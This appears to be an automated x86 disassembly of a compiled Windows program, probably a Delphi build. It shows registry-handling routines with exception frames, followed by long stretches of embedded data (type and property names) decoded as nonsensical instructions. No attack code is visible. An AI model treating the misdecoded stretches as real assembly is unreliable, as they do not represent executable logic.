mov edx [ ebp - 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444bfc
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx eax
lea eax [ ebp - 0x50 ]
call sub_407254
mov edx [ ebp - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_445ca4
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_446540
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
call sub_446254
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
call sub_44638c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446547
mov eax [ ebp - 0x24 ]
push eax
call RegCloseKey
retn
sub_4465e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446020
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446020
test al al
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445ca4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4466ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_444bfc
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445ca4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call RegCloseKey
retn
xor eax eax
push ebp
push sub_4466ac
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_446254
pop ecx
push ebp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44638c
pop ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_444ff8
sub_4466f3
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_44674d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446754
retn
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_407e40
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_407e40
sub_446758
pop esp
inc esp
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
add al [ eax ]
nop
enter 0x4467 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x67
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc esp
add [ eax + eax ] bl
add [ eax ] al
dec esp
fadd [ eax ]
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax + ebx * 8 + 0x40 ] cl
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax ] dl
inc ecx
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl sp sp
inc esp
add [ edi ] al
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
clc
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
rcr [ eax + 0x40 ] 0x1
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl ax cx
inc esp
add al ah
fadd [ eax ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
push esp
imul eax [ eax + eax + 0x1 ] 0x6f46540c
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add ah dh
push 0x66090044
dec eax
popad
outsb
insb
add al [ gs : eax ]
add al [ eax ]
nop
clc
push 0xa030044
add [ edx ] al
push es
je r-xdata
inc cx
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
imul esp [ ebx + 0x73 ] 0x0
add al [ eax ]
mov eax eax
push 0x4468
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4468 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x68 ] dh
inc esp
add [ eax + eax ] bl
add [ eax ] al
dec esp
fadd [ eax ]
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
jae r-xdata
push 0x65737261
je r-xdata
outsb
je r-xdata
popa
jne r-xdata
push esp
inc esi
outsd
outsb
je r-xdata
add [ edx ] al
add [ eax + r-xdata ] dl
outsd
outsb
lea eax [ eax ]
nop
push 0x18070044
inc ebp
dec ecx
outsb
jbe r-xdata
push esp
outsb
add [ eax ] al
add bh bh
add [ eax ] al
add [ edx ] al
add [ ebp + 0x69740040 ] cl
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
add al [ eax ]
lea eax [ eax ]
add [ eax ] al
add [ eax + 0x69 ] dh
je r-xdata
add ecx [ edx ]
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or ecx [ edi + 0x72 ]
imul esp [ ebp + 0x6e ] 0x69746174
je r-xdata
push esp
inc esi
outsd
imul ebp [ esi + 0x65 ] 0x5373660b
je r-xdata
jae r-xdata
je r-xdata
add [ 0x6f46540d ] al
inc esp
add [ ebx ] al
imul eax [ eax + eax + 0x2 ] 0x4469dc00
outsd
insb
or [ fs : esi + 0x73 ] ah
dec ecx
pop es
jo r-xdata
add [ eax ] al
add al [ eax ]
add [ eax ] al
hlt
je r-xdata
add [ 0x2000000 ] cl
add eax 0x6c797453
insb
jae r-xdata
popad
popad
je r-xdata
add [ eax ] al
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jo r-xdata
inc esi
outsd
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
dec eax
popad
outsb
insb
add al [ gs : eax ]
pushfd
adc [ eax ] al
add al 0x0
cmp [ edi + 0x40 ] ch
add [ eax ] al
add al [ esi ]
popad
je r-xdata
push ebx
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
je r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
popad
jb r-xdata
or [ esi + 0x70 ] esp
inc esp
outsd
outsb
push 0xe0004468
fadd [ eax ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
imul eax [ eax + eax + 0xf ] 0x2000000
add al 0x4e
popad
insd
add al [ gs : eax ]
add al [ eax ]
mov eax eax
mov al 0x6a
inc esp
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
add al bl
dec eax
imul esp [ gs : edi + 0x68 ] 0x9c000274
popad
jae r-xdata
pop es
outsd
outsb
add al [ eax ]
hlt
add al [ gs : eax ]
push eax
imul eax [ eax + eax + 0xe ] 0x2000000
pop es
inc ebx
push 0x65737261
je r-xdata
add al [ 0x6c797453 ]
mov [ eax ] es
add [ eax ] al
jo r-xdata
add [ eax ] al
lodsb [ esi ]
push 0x44
add [ edi ] al
outsb
je r-xdata
popad
jo r-xdata
add [ eax ] al
add al [ esi ]
add [ eax + eax ] al
outsb
je r-xdata
inc esp
add [ edx ] al
add ah bl
imul eax [ eax + eax + 0x5 ] 0x6f46540d
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add cl [ ebx ]
dec edi
jb r-xdata
push 0x9c000274
dec esi
popad
insd
jl r-xdata
arpl [ ebx ] cx
jae r-xdata
imul esp [ ebx + 0x73 ] 0x408d0002
add [ eax + 0x69 ] al
inc esp
add [ esi ] al
jae r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
imul esp [ ebx + 0x73 ] 0x0
add al [ eax ]
nop
enter 0x4468 0x0
push cs
or [ edx + edx * 2 + 0x65 ] dl
jae r-xdata
inc esp
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ edx + ebp * 2 + 0x70070044 ] ch
jae r-xdata
add [ edx ] al
add eax 0x63746950
push 0x69f00002
inc esp
outsb
je r-xdata
add [ eax + 0x69 ] esi
inc esp
add [ edx ] al
add [ eax ] dl
push 0x44
add [ esi ] cl
or [ esi + eax * 2 + 0x6f ] edx
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax ] dh
imul eax [ eax + eax + 0x7 ] 0x70
insd
add [ eax ] eax
push ebx
add [ eax ] al
or [ eax ] al
je r-xdata
add [ edi ] al
add [ eax ] al
add [ eax ] bh
scasd [ edi ]
inc eax
add [ eax ] al
add [ eax ] al
add [ edx ] al
push es
imul esp [ ebx + 0x73 ] 0x69c40002
inc esp
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
outsb
je r-xdata
shl ah 0x69
inc esp
add [ esi ] al
andps xmm0 [ esi + 0x6f ]
add [ ebx + 0x4469f4c0 ] cl
jae r-xdata
popad
insd
add al [ gs : eax ]
lea eax [ eax ]
jo r-xdata
popad
je r-xdata
insd
push edi
push 0x5657469
jo r-xdata
popad
je r-xdata
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
je r-xdata
or al 0x70
jae r-xdata
jo r-xdata
add [ eax ] al
je r-xdata
je r-xdata
inc esp
add [ edx ] dl
or [ esi + eax * 2 + 0x6f ] edx
outsb
je r-xdata
push 0x2736369
add [ ebp + 0x69400040 ] cl
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ esi ]
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bh
add eax 0x74646957
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
jo r-xdata
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ebx + ebp * 2 ] dh
popad
jae r-xdata
jo r-xdata
pop es
inc esp
popad
jae r-xdata
push 0x9c000274
insb
inc eax
push 0x6c797453
add [ eax + eax ] al
add [ eax ] al
add al [ 0x6f6c6f43 ]
popad
jae r-xdata
push es
jo r-xdata
inc esp
popad
dec ebp
popad
jae r-xdata
dec esi
outsd
je r-xdata
imul esp [ ebx + 0x73 ] 0x408d0002
inc esp
outsd
je r-xdata
jo r-xdata
inc esp
outsd
je r-xdata
inc esp
push 0x61746144
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
outsd
jb r-xdata
push 0x6aac0002
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ 0x74646957 ]
add [ eax + edx + 0x80040 ] bl
inc esp
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
adc [ eax ] al
je r-xdata
push eax
outsb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
dec ebp
outsd
add [ gs : eax ] eax
push esp
push eax
outsb
outsd
je r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
pop es
jo r-xdata
add al [ gs : eax ]
les ebp [ eax + 0x44 ]
add [ eax ] dl
add [ eax ] al
add [ edx ] al
add al 0x44
jne r-xdata
mov [ 0x80044 ] eax
add [ eax ] al
add al [ esi ]
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x50000270
add [ eax - 0x5d ] bh
inc esp
add [ eax ] cl
add [ eax ] al
add [ edx ] al
push es
jb r-xdata
add [ edx ] al
add eax 0x6f6c6f43
imul esp [ ebx + 0x61 ] 0x73620b6c
inc esi
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
scasd [ edi ]
jpe r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x6bf00002
inc esp
or [ eax + 0x6d ] esi
dec esi
je r-xdata
outsd
jb r-xdata
jo r-xdata
outsb
insb
add al [ gs : eax ]
pop eax
inc esp
dec esi
outsd
je r-xdata
add [ eax ] al
pushfd
scasd [ edi ]
inc eax
add al 0x0
dec ebp
jb r-xdata
or eax 0x6e497370
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] al
push es
dec eax
popad
jb r-xdata
inc ebx
insb
popad
jb r-xdata
insd
inc esp
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x63ffbcee ] ah
adc eax [ ebx ]
movsb [ edi ] [ esi ]
adc eax [ ebx ]
int3
add al [ eax ]
or al 0x6a
inc esp
add [ eax ] dl
add [ eax ] al
add [ edx ] al
popad
je r-xdata
push 0x100044
add [ eax ] al
add al [ esp + eax * 2 ]
arpl [ ebp + 0x64 ] sp
insd
inc esp
add [ edx ] al
add [ ebp + 0x6d680040 ] cl
inc esp
add [ esi ] cl
or [ edx + edx * 2 + 0x65 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add al [ esi + ecx * 2 ]
push eax
push edx
jae r-xdata
imul esi [ ebp + ebp * 2 + 0x61 ] 0x2000270
insb
inc esp
add [ eax + eax ] cl
add [ eax ] al
add al [ 0x6c797453 ]
jae r-xdata
push es
dec eax
popad
outsb
insb
add al [ gs : eax ]
pop eax
inc esp
add [ eax + eax ] al
add [ eax ] al
add al [ 0x6f6c6f43 ]
outsb
je r-xdata
rcl [ esp + ebp * 2 + 0x44 ] 0x0
add ecx [ ebx ]
push esp
inc edx
jb r-xdata
add al [ gs : eax ]
add al [ eax ]
mov eax eax
push esp
insb
inc esp
add [ ebx ] al
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
insb
dec esi
outsd
je r-xdata
insd
outsd
jo r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
insb
add [ eax + eax ] cl
add [ eax ] al
add al [ 0x6c797453 ]
add al [ eax ]
lodsb [ esi ]
push 0x44
add al [ eax ]
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
outsb
pop es
jo r-xdata
add [ eax ] al
dec esi
outsd
je r-xdata
jo r-xdata
inc esi
jb r-xdata
jb r-xdata
push es
jo r-xdata
or esi [ eax + 0x73 ]
jo r-xdata
imul eax [ eax + eax + 0x10 ] 0x0
add [ eax ] al
add al [ ebx ]
push eax
outsb
add al [ eax ]
shr [ esp + eax * 2 ] 0x1
adc [ eax ] al
add [ eax ] al
add al [ 0x73757242 ]
add ah ch
outsd
outsb
je r-xdata
adc [ eax ] al
add [ eax ] al
add al [ esi + eax * 2 ]
jne r-xdata
push 0x20002
outsb
inc esp
add eax 0x73757242
add al [ eax ]
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
add cl [ eax ]
push edx
inc bx
outsd
jne r-xdata
add al [ gs : eax ]
add [ eax ] dl
inc eax
add [ 0x2000000 ] cl
or cl [ edi + 0x77 ]
outsb
jae r-xdata
add [ edx ] al
add eax 0x6c797453
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
inc eax
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
or al 0xaf
insb
add ah dl
insb
jae r-xdata
or [ eax + edx * 2 + 0x65 ] dl
outsb
or eax 0x654d6d70
jb r-xdata
je r-xdata
jo r-xdata
add [ eax ] al
add [ edx ] al
add eax 0x6f6c6f43
dec ebp
jb r-xdata
add [ esi ] cl
outsb
insd
push ebp
jae r-xdata
insd
or esi [ gs : eax + 0x73 ]
add [ edx ] al
dec ebp
popad
jae r-xdata
jb r-xdata
outsd
je r-xdata
jae r-xdata
dec ecx
outsb
add al 0x46
js r-xdata
arpl [ ebp - 0x64 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
dec esp
insd
inc esp
add [ eax ] al
add [ eax ] al
add [ edx ] al
add al 0x4e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 ] cl
inc esp
add [ esi + ebp * 2 + 0x44 ] dh
add [ esi + ebp * 2 + 0x44 ] bh
add [ eax ] al
enter 0x446e 0x0
sbb al 0x0
add [ eax ] al
push 0xac00425f
je r-xdata
inc esp
add [ esi ] cl
or dl [ edx + eax * 2 + 0x72 ]
jne r-xdata
add al [ eax ]
lea eax [ eax ]
aam 0x6c
inc edi
jb r-xdata
push ebx
je r-xdata
push 0x2736369
add al dh
imul eax [ eax + eax + 0xe ] 0x8
push esp
push eax
outsb
push eax
outsb
jae r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
outsd
je r-xdata
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ esi ]
dec eax
popad
outsb
insb
add al [ gs : eax ]
int3
add al bh
add [ eax ] al
jo r-xdata
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0x6c ] dl
inc esp
add [ edi ] al
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
jb r-xdata
insb
or eax 0x654d6d70
jb r-xdata
insb
or esi [ gs : eax + 0x73 ]
inc ecx
insb
je r-xdata
imul esp [ ebx + 0x73 ] 0x408d0002
add [ ecx + ecx ] dl
jae r-xdata
dec esi
outsd
je r-xdata
outsb
jb r-xdata
insd
popad
jo r-xdata
inc esp
popad
je r-xdata
add [ eax + r-xdata ] dl
adc al 0x9
add [ edx ] al
inc edx
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xc000000 ] al
sub_446a64
push 0xc0044
add [ eax ] al
add al [ 0x63746950 ]
push 0x69f00002
inc esp
add [ 0x2000000 ] cl
add eax 0x6c797453
add al [ gs : eax ]
push eax
imul eax [ eax + eax + 0xe ] 0x2000000
pop es
inc ebx
push 0x65737261
je r-xdata
imul eax [ eax + eax + 0xf ] 0x2000000
add al 0x4e
popad
insd
add al [ gs : eax ]
add al [ eax ]
mov eax eax
mov al 0x6a
inc esp
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
add al bl
inc esp
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ edx + ebp * 2 + 0x70070044 ] ch
jae r-xdata
insd
push edi
push 0x5657469
jo r-xdata
popad
je r-xdata
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
je r-xdata
add eax 0x74646957
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
jo r-xdata
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
inc eax
push 0x6c797453
add [ eax + eax ] al
add [ eax ] al
add al [ 0x6f6c6f43 ]
popad
jae r-xdata
push es
jo r-xdata
inc esp
popad
dec ebp
popad
jae r-xdata
dec esi
outsd
je r-xdata
imul esp [ ebx + 0x73 ] 0x408d0002
add [ ebx + ebp * 2 ] dh
popad
jae r-xdata
jo r-xdata
pop es
inc esp
popad
jae r-xdata
inc esp
push 0x61746144
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
outsd
jb r-xdata
push 0x6aac0002
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ 0x74646957 ]
add [ eax + edx + 0x80040 ] bl
inc esp
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
adc [ eax ] al
je r-xdata
push eax
outsb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
inc esp
outsd
je r-xdata
jo r-xdata
inc esp
outsd
je r-xdata
add al [ gs : eax ]
les ebp [ eax + 0x44 ]
add [ eax ] dl
add [ eax ] al
add [ edx ] al
add al 0x44
jne r-xdata
mov [ 0x80044 ] eax
add [ eax ] al
add al [ esi ]
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x50000270
add [ eax - 0x5d ] bh
inc esp
add [ eax ] cl
add [ eax ] al
add [ edx ] al
push es
jb r-xdata
add [ edx ] al
add eax 0x6f6c6f43
imul esp [ ebx + 0x61 ] 0x73620b6c
inc esi
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
scasd [ edi ]
jpe r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x6bf00002
inc esp
or [ eax + 0x6d ] esi
dec esi
je r-xdata
outsd
jb r-xdata
jo r-xdata
outsb
insb
add al [ gs : eax ]
pop eax
inc esp
dec esi
outsd
je r-xdata
add [ eax ] al
pushfd
scasd [ edi ]
inc eax
add al 0x0
dec ebp
jb r-xdata
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax ] dh
imul eax [ eax + eax + 0x7 ] 0x70
insd
push esp
push eax
outsb
outsd
je r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
pop es
jo r-xdata
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x63ffbcee ] ah
adc eax [ ebx ]
movsb [ edi ] [ esi ]
adc eax [ ebx ]
int3
add al [ eax ]
or al 0x6a
inc esp
add [ eax ] dl
add [ eax ] al
add [ edx ] al
popad
je r-xdata
push 0x100044
add [ eax ] al
add al [ esp + eax * 2 ]
arpl [ ebp + 0x64 ] sp
insd
inc esp
add [ edx ] al
add [ ebp + 0x6d680040 ] cl
inc esp
add [ esi ] cl
or [ edx + edx * 2 + 0x65 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add al [ esi + ecx * 2 ]
push eax
push edx
jae r-xdata
imul esi [ ebp + ebp * 2 + 0x61 ] 0x2000270
insb
inc esp
add [ eax + eax ] cl
add [ eax ] al
add al [ 0x6c797453 ]
jae r-xdata
push es
dec eax
popad
outsb
insb
add al [ gs : eax ]
pop eax
inc esp
add [ eax + eax ] al
add [ eax ] al
add al [ 0x6f6c6f43 ]
outsb
je r-xdata
rcl [ esp + ebp * 2 + 0x44 ] 0x0
add ecx [ ebx ]
push esp
inc edx
jb r-xdata
add al [ gs : eax ]
add al [ eax ]
mov eax eax
push esp
insb
inc esp
add [ ebx ] al
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
insb
dec esi
outsd
je r-xdata
insd
outsd
jo r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
insb
add [ eax + eax ] cl
add [ eax ] al
add al [ 0x6c797453 ]
add al [ eax ]
lodsb [ esi ]
push 0x44
add al [ eax ]
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
outsb
pop es
jo r-xdata
add [ eax ] al
dec esi
outsd
je r-xdata
or eax 0x6e497370
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] al
push es
dec eax
popad
jb r-xdata
inc ebx
insb
popad
jb r-xdata
insd
inc esp
imul eax [ eax + eax + 0x10 ] 0x0
add [ eax ] al
add al [ ebx ]
push eax
outsb
add al [ eax ]
shr [ esp + eax * 2 ] 0x1
adc [ eax ] al
add [ eax ] al
add al [ 0x73757242 ]
add ah ch
outsd
outsb
je r-xdata
adc [ eax ] al
add [ eax ] al
add al [ esi + eax * 2 ]
jne r-xdata
push 0x20002
outsb
inc esp
add eax 0x73757242
add al [ eax ]
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
add cl [ eax ]
push edx
inc bx
outsd
jne r-xdata
add al [ gs : eax ]
add [ eax ] dl
inc eax
add [ 0x2000000 ] cl
or cl [ edi + 0x77 ]
outsb
jae r-xdata
add [ edx ] al
add eax 0x6c797453
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
inc eax
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
or al 0xaf
insb
add ah dl
insb
jae r-xdata
or [ eax + edx * 2 + 0x65 ] dl
outsb
or eax 0x654d6d70
jb r-xdata
je r-xdata
jo r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add eax 0x6f6c6f43
dec ebp
jb r-xdata
add [ esi ] cl
outsb
jo r-xdata
inc esi
jb r-xdata
push es
jo r-xdata
or esi [ eax + 0x73 ]
jo r-xdata
add al 0x46
js r-xdata
arpl [ ebp - 0x64 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
dec esp
insd
inc esp
add [ eax ] al
add [ eax ] al
add [ edx ] al
add al 0x4e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 ] cl
inc esp
add [ esi + ebp * 2 + 0x44 ] dh
add [ esi + ebp * 2 + 0x44 ] bh
add [ eax ] al
enter 0x446e 0x0
sbb al 0x0
add [ eax ] al
push 0xac00425f
je r-xdata
inc esp
add [ esi ] cl
or dl [ edx + eax * 2 + 0x72 ]
jne r-xdata
add al [ eax ]
lea eax [ eax ]
aam 0x6c
inc edi
jb r-xdata
push ebx
je r-xdata
push 0x2736369
add al dh
imul eax [ eax + eax + 0xe ] 0x8
push esp
push eax
outsb
push eax
outsb
jae r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
insd
push ebp
jae r-xdata
insd
or esi [ gs : eax + 0x73 ]
add [ edx ] al
dec ebp
popad
jae r-xdata
jb r-xdata
outsd
je r-xdata
jae r-xdata
dec ecx
outsb
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ esi ]
dec eax
popad
outsb
insb
add al [ gs : eax ]
int3
add al bh
add [ eax ] al
jo r-xdata
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0x6c ] dl
inc esp
add [ edi ] al
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
jb r-xdata
insb
or eax 0x654d6d70
jb r-xdata
outsd
je r-xdata
je r-xdata
imul esp [ ebx + 0x73 ] 0x408d0002
add [ ecx + ecx ] dl
jae r-xdata
insb
or esi [ gs : eax + 0x73 ]
inc ecx
insb
je r-xdata
insd
popad
jo r-xdata
inc esp
popad
je r-xdata
dec esi
outsd
je r-xdata
outsb
jb r-xdata
add [ eax + r-xdata ] dl
adc al 0x9
add [ edx ] al
inc edx
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xc000000 ] al
sub_4470a8
inc [ ecx + esi * 2 ]
inc esp
add [ edx ] cl
add al [ eax ]
add eax 0x6e6f4654
je r-xdata
add [ eax + eax * 8 ] bh
inc esp
add [ edi ] al
inc esp
jae r-xdata
add ah bl
mov edi 0x43060044
jb r-xdata
push eax
imul eax [ eax + eax + 0x10 ] 0x180044c6
jb r-xdata
add al [ eax ]
popad
je r-xdata
add eax [ eax ]
add al 0x4e
inc esp
jae r-xdata
jns r-xdata
popad
insd
pushfd
adc [ eax ] al
push eax
mov [ eax + eax + 0x58 ] 0xc6
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or ecx [ edi + 0x72 ]
